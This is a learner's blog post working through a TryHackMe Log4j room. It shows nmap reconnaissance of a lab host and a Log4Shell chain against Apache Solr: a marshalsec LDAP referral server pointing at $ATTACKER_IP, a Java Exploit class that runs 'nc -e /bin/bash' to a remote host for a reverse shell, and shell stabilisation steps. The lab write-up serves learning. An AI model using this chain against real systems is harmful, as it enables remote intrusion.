---
title: 'TryHackMe: Complete Beginner (Supplements) &amp; Exploiting Log4j'
date: 2022-01-02 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-01-02-tryhackme-complete-beginner-supplements-and-exploiting-log4j.html
author: 100007
---

<h1 id="tryhackme-complete-beginner-supplements--exploiting-log4j">TryHackMe: Complete Beginner (Supplements) &amp; Exploiting Log4j</h1>
<p><strong>author:</strong> Nathan Acks<br />
<strong>date:</strong> 2022-01-02</p>
<p>Finishing up the supplemental rooms around the TryHackMe: Complete Beginner sequence and then working through a special room covering the recently discovered Log4j vulnerabilities as a fun aside.</p>
<ul>
<li><a href="https://tryhackme.com/path-action/beginner/">TryHackMe: Complete Beginner</a></li>
<li><a href="https://tryhackme.com/room/solar">TryHackMe: Solar, exploiting log4j</a></li>
</ul>
<h1 id="tryhackme-complete-beginner-supplements">TryHackMe: Complete Beginner (Supplements)</h1>
<h2 id="retro">Retro</h2>
<p><a href="https://cardboard-iguana.com/notes/tryhackme-retro.html">See my Retro CTF write-up.</a></p>
<h1 id="exploiting-log4j">Exploiting Log4j</h1>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>The target has an IP address of 10.10.177.64. We’ll start off with a normal nmap scan, though I’m going to be a bit less aggressive since we’re just looking to enumerate ports/services.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-oA</span> solar <span class="nt">-A</span> <span class="nt">-T4</span> <span class="nt">-sS</span> <span class="nt">-p-</span> 10.10.177.64
</code></pre></div></div>
<p>This gives us:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Sun Jan 2 20:58:25 2022 as: nmap -v -oA solar -A -T4 -sS -p- 10.10.177.64
Nmap scan report for 10.10.177.64
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 (RSA)
| 256 b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 (ECDSA)
|_ 256 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 (ED25519)
111/tcp open rpcbind 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100000 3,4 111/tcp6 rpcbind
|_ 100000 3,4 111/udp6 rpcbind
8983/tcp open http Apache Solr
| http-title: Solr Admin
|_Requested resource was http://10.10.177.64:8983/solr/
|_http-favicon: Unknown favicon MD5: ED7D5C39C69262F4BA95418D4F909B10
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/2%OT=22%CT=1%CU=42554%PV=Y%DS=4%DC=T%G=Y%TM=61D276A8
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
OS:NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)
Uptime guess: 44.471 days (since Fri Nov 19 09:49:52 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE (using port 199/tcp)
HOP RTT ADDRESS
1 29.11 ms 10.13.0.1
2 ... 3
4 171.20 ms 10.10.177.64
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 2 21:08:08 2022 -- 1 IP address (1 host up) scanned in 582.99 seconds
</code></pre></div></div>
<p>The service running on port 8983 has an HTML page title of “Solr Admin”, which seems to be part of Apache Solr.</p>
<ul>
<li><a href="https://cardboard-iguana.com/notes/nmap.html">Using “nmap”</a></li>
<li><a href="https://solr.apache.org/">Apache Solr</a></li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>It’s still not 100% clear to me why use of LDAP is required to trigger Log4Shell, but I’m <em>guessing</em> this is used because it’s one of the protocols that JNDI supports. This makes a little more sense given that JNDI stands for the Java Naming and <em>Directory</em> Interface… But it still feels kinda wacky to me that one would store Java objects in… LDAP.</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface">Java Naming and Directory Interface (Wikipedia)</a></li>
</ul>
<h2 id="exploitation">Exploitation</h2>
<p>This section makes the question I wrote above at least a little more clear – LDAP is providing a URL using a more sensible protocol like HTTP that JNDI is then loading the Java code from. So the sequence is malicious request -&gt; LDAP lookup -&gt; load Java code over HTTP.</p>
<p>A simple Java LDAP server that will do just this is available at https://github.com/mbechler/marshalsec. It can be built with Apache Maven using the version of OpenJDK supplied with Kali Linux:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mvn clean package <span class="nt">-DskipTests</span>
</code></pre></div></div>
<p>And run with:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar <span class="se">\</span>
marshalsec.jndi.LDAPRefServer <span class="se">\</span>
<span class="s2">"http://</span><span class="nv">$ATTACKER_IP</span><span class="s2">:</span><span class="nv">$ATTACKER_PORT</span><span class="s2">/#Exploit"</span>
</code></pre></div></div>
<p>Where <code class="language-plaintext highlighter-rouge">$ATTACKER_IP</code> and <code class="language-plaintext highlighter-rouge">$ATTACKER_PORT</code> are the IP address and port of an HTTP server that will be used to actually serve up the exploit.</p>
<p>A simple Java exploit that pops a reverse shell (at least on Linux systems with a version of netcat that supports the <code class="language-plaintext highlighter-rouge">-e</code> switch) is:</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">&#x007b;</span>
<span class="kd">static</span> <span class="o">&#x007b;</span>
<span class="k">try</span> <span class="o">&#x007b;</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"nc -e /bin/bash 1.2.3.4 9999"</span><span class="o">);</span>
<span class="o">&#x007d;</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">&#x007b;</span>
<span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="o">&#x007d;</span>
<span class="o">&#x007d;</span>
<span class="o">&#x007d;</span>
</code></pre></div></div>
<p>Where 1.2.3.4 should match <code class="language-plaintext highlighter-rouge">$ATTACKER_IP</code> above, and 9999 is the port of the local listener. This can be compiled with:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac Exploit.java <span class="nt">-source</span> 8 <span class="nt">-target</span> 8
</code></pre></div></div>
<p>Note that the <code class="language-plaintext highlighter-rouge">-source</code> and <code class="language-plaintext highlighter-rouge">-target</code> flags may need to be modified depending on which version of Java the target is running. As with all things Java, the file name and file class name need to match.</p>
<ul>
<li><a href="https://cardboard-iguana.com/notes/netcat.html">Using “netcat”</a></li>
</ul>
<h2 id="persistence">Persistence</h2>
<p>Generic netcat shell stabilization steps (when running bash at <em>both</em> ends):</p>
<ul>
<li>Run <code class="language-plaintext highlighter-rouge">python3 -c "import pty; pty.spawn('/bin/bash')"</code> on the target.</li>
<li>Background the reverse shell with Ctrl+Z.</li>
<li>Run <code class="language-plaintext highlighter-rouge">stty raw -echo</code> to disable foreground echo (echo will be handled by the target).</li>
<li>Foreground the reverse shell with <code class="language-plaintext highlighter-rouge">fg</code> (there won’t be any output).</li>
<li>Hit Enter a couple of times to get back a prompt, and then <code class="language-plaintext highlighter-rouge">export TERM=xterm</code>.</li>
</ul>
<p>That should be good enough.</p>